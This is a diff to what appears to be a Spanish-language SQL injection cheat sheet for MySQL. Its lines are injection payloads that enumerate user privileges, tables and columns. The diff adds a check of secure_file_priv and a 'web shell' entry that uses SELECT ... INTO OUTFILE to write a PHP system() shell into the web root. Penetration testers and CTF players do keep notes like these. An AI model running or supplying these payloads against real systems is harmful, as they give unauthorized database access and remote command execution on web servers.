@@ -35,6 +35,8 @@ DROP TABLE <tabla>;
 ### Leer variables de entorno:
 SHOW VARIABLES LIKE '<variable>';
 
+SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
+
 ### enumerar privilegios del usuario:
 SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges--
 
@@ -46,7 +48,8 @@ select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_sc
 
 select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='<table>'--
 
-
+## web shell:
+select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
 
 
 
